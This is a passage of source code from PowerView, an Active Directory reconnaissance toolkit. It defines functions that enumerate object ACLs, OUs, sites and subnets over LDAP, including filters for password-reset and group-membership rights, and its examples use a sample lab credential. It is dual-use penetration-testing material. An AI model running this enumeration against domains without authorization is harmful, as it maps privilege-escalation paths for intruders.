Get-DomainObjectAcl -Credential $Cred -ResolveGUIDs

.OUTPUTS

PowerView.ACL

Custom PSObject with ACL entries.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $Sacl,

        [Switch]
        $ResolveGUIDs,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
        }

        if ($PSBoundParameters['Sacl']) {
            $SearcherArguments['SecurityMasks'] = 'Sacl'
        }
        else {
            $SearcherArguments['SecurityMasks'] = 'Dacl'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $Searcher = Get-DomainSearcher @SearcherArguments

        $DomainGUIDMapArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainGUIDMapArguments['Server'] = $Server }
        if ($PSBoundParameters['ResultPageSize']) { $DomainGUIDMapArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }

        # get a GUID -> name mapping
        if ($PSBoundParameters['ResolveGUIDs']) {
            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($Searcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-.*') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $Searcher = Get-DomainSearcher @SearcherArguments
                        if (-not $Searcher) {
                            Write-Warning "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            if ($Filter) {
                $Searcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)"

            $Results = $Searcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties

                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $ObjectSid = $Null
                }

                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters['RightsFilter']) {
                            $GuidFilter = Switch ($RightsFilter) {
                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                                Default { '00000000-0000-0000-0000-000000000000' }
                            }
                            if ($_.ObjectType -eq $GuidFilter) {
                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                                $Continue = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid
                            $Continue = $True
                        }

                        if ($Continue) {
                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                # if we're resolving GUIDs, map them them to the resolved hash table
                                $AclProperties = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $AclProperties[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.Name] = $_.Value
                                    }
                                }
                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties
                                $OutObject.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $OutObject
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[Get-DomainObjectAcl] Error: $_"
                }
            }
        }
    }
}

function Get-DomainOU {
<#
.SYNOPSIS

Search for all organization units (OUs) or specific OU objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties whencreated,usnchanged,...". By default, all OU objects for
the current domain are returned.

.PARAMETER Identity

An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a). Wildcards accepted.

.PARAMETER GPLink

Only return OUs with the specified GUID in their gplink property.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainOU

Returns the current OUs in the domain.

.EXAMPLE

Get-DomainOU *admin* -Domain testlab.local

Returns all OUs with "admin" in their name in the testlab.local domain.

.EXAMPLE

Get-DomainOU -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"

Returns all OUs with linked to the specified group policy object.

.EXAMPLE

"*admin*","*server*" | Get-DomainOU

Search for OUs with the specific names.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainOU -Credential $Cred

.OUTPUTS

PowerView.OU

Custom PSObject with translated OU property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $OUSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^OU=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainOU] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $OUSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $OUSearcher) {
                            Write-Warning "[Get-DomainOU] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainOU] Searching for OUs with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainOU] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $OUSearcher.FindOne() }
            else { $Results = $OUSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $OU = $_
                }
                else {
                    $OU = Convert-LDAPProperty -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainOU] Error disposing of the Results object: $_"
                }
            }
            $OUSearcher.dispose()
        }
    }
}

function Get-DomainSite {
<#
.SYNOPSIS

Search for all sites or specific site objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties whencreated,usnchanged,...". By default, all site objects for
the current domain are returned.

.PARAMETER Identity

An site name (e.g. Test-Site), DistinguishedName (e.g. CN=Test-Site,CN=Sites,CN=Configuration,DC=testlab,DC=local), or
GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.

.PARAMETER GPLink

Only return sites with the specified GUID in their gplink property.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainSite

Returns the current sites in the domain.

.EXAMPLE

Get-DomainSite *admin* -Domain testlab.local

Returns all sites with "admin" in their name in the testlab.local domain.

.EXAMPLE

Get-DomainSite -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"

Returns all sites with linked to the specified group policy object.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSite -Credential $Cred

.OUTPUTS

PowerView.Site

Custom PSObject with translated site property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $SiteSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SiteSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSite] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $SiteSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SiteSearcher) {
                            Write-Warning "[Get-DomainSite] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainSite] Searching for sites with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainSite] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $SiteSearcher.filter = "(&(objectCategory=site)$Filter)"
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $SiteSearcher.FindAll() }
            else { $Results = $SiteSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $Site = $_
                }
                else {
                    $Site = Convert-LDAPProperty -Properties $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSite] Error disposing of the Results object"
                }
            }
            $SiteSearcher.dispose()
        }
    }
}

function Get-DomainSubnet {
<#
.SYNOPSIS

Search for all subnets or specific subnets objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties whencreated,usnchanged,...". By default, all subnet objects for
the current domain are returned.

.PARAMETER Identity

An subnet name (e.g. '192.168.50.0/24'), DistinguishedName (e.g. 'CN=192.168.50.0/24,CN=Subnets,CN=Sites,CN=Configuratioiguration,DC=testlab,DC=local'),
or GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.

.PARAMETER SiteName

Only return subnets from the specified SiteName.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainSubnet

Returns the current subnets in the domain.

.EXAMPLE

Get-DomainSubnet *admin* -Domain testlab.local

Returns all subnets with "admin" in their name in the testlab.local domain.

.EXAMPLE

Get-DomainSubnet -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"

Returns all subnets with linked to the specified group policy object.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSubnet -Credential $Cred

.OUTPUTS

PowerView.Subnet

Custom PSObject with translated subnet property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SubnetSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSubnet] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SubnetSearcher) {
                            Write-Warning "[Get-DomainSubnet] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainSubnet] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $SubnetSearcher.filter = "(&(objectCategory=subnet)$Filter)"
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $SubnetSearcher.FindOne() }
            else { $Results = $SubnetSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $Subnet = $_
                }
                else {
                    $Subnet = Convert-LDAPProperty -Properties $_.Properties
                }
                $Subnet.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if ($PSBoundParameters['SiteName']) {
                    # have to do the filtering after the LDAP query as LDAP doesn't let you specify
                    #   wildcards for 'siteobject' :(
